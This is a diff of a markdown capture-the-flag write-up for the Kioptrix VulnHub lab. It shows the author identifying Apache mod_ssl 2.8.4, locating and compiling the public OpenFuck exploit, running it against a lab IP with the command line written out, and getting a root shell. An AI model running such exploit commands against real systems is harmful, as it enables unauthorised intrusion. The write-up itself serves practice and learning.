@@ -51,47 +51,29 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 107.74 seconds
 ```
 
-
-
 ====================================================
 
 No interesting files/directories found in dirbuster
 
 ====================================================
 
-
-
 The vulnerable service is
 
-443/tcp  open  ssl/https   Apache/1.3.20 \(Unix\)  \(Red-Hat/Linux\) mod\_ssl/2.8.4 OpenSSL/0.9.6b
+`443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b`
 
+* searchploit this "mod\_ssl/2.8.4"
 
+* found available exploit for the vulnerable mod\_ssl/2.8.4
 
-- searchploit this "mod\_ssl/2.8.4"
+* openfuck exploit: [https://www.exploit-db.com/exploits/764/](https://www.exploit-db.com/exploits/764/)
 
+* updating the exploit: [http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/](http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/)
 
+* if there are errors in compilation install the following libssl versions.
 
-- found available exploit for the vulnerable mod\_ssl/2.8.4
+* link on how i solved the compilation error: [http://www.chokepoint.net/2017/04/fixing-and-troubleshooting-openfuck.html](http://www.chokepoint.net/2017/04/fixing-and-troubleshooting-openfuck.html)
 
-
-
-- openfuck exploit: https://www.exploit-db.com/exploits/764/
-
-
-
-- updating the exploit: http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/
-
-
-
-- if there are errors in compilation install the following libssl versions.
-
-- link on how i solved the compilation error: http://www.chokepoint.net/2017/04/fixing-and-troubleshooting-openfuck.html
-
-
-
-- after compiling and generated the exec file
-
-
+* after compiling and generated the exec file, run this command` ./openfuck 0x6b 192.168.8.4 443 -c 40`
 
     kaipowered@debian:~/Documents/Vulnhub/Kioptrix$ ./openfuck 0x6b 192.168.8.4 443 -c 40
 
@@ -134,21 +116,19 @@ The vulnerable service is
     [+] Shellcode placed at 0x4001189d
     [+] Now wait for suid shell...
 
-
-
 we got root!
 
+Note:
 
+```
+I tried dirbustering the web server but i haven't found any interesting files/directories.
 
-Note: 
+I also searched some available exploits in rpcbind but in turns out that the nfs protocol must be present or active in order to exploit the rpc service.
 
-	I tried dirbustering the web server but i haven't found any interesting files/directories.
+I also tried the exploit/multi/samba/usermap\_script but it didn't work.
 
-	I also searched some available exploits in rpcbind but in turns out that the nfs protocol must be present or active in order to exploit the rpc service.
-
-	I also tried the exploit/multi/samba/usermap\_script but it didn't work.
-
-	This vm is for beginners.
+This vm is for beginners.
+```
 
 
 
